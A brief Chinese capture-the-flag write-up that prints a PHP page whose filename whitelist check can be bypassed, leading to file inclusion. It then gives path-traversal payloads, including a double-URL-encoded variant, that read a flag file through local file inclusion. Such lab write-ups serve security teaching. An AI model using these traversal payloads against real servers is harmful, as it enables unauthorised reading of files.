
1. 通过f12查看源码，发现注释里面有source.php疑似文件，然后就访问/source.php

2. 发现有
```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
        //白名单定义
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }
            //直接检查?之前的是否符合白名单
            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            //方式2，url解码，然后再检查?之前的是否符合白名单
            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        //文件包含$_REQUEST['file'],包括$GET,$POST,$COOKIE等变量中包含的"file"参数
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```
3. 发现代码中有个hint文件，访问显示"flag in ffffllllaaaagggg"文件，

4. 根据代码的漏洞过滤，构造source.php?../../../../../ffffllllaaaagggg,然后访问被执行，可以LFI读取flag文件（也可以试source.php%253f%252f..%252f..%252ffffllllaaaagggg。%253经过浏览器和urldecode()解码后为?，%252f解码后为/）,同样可以绕过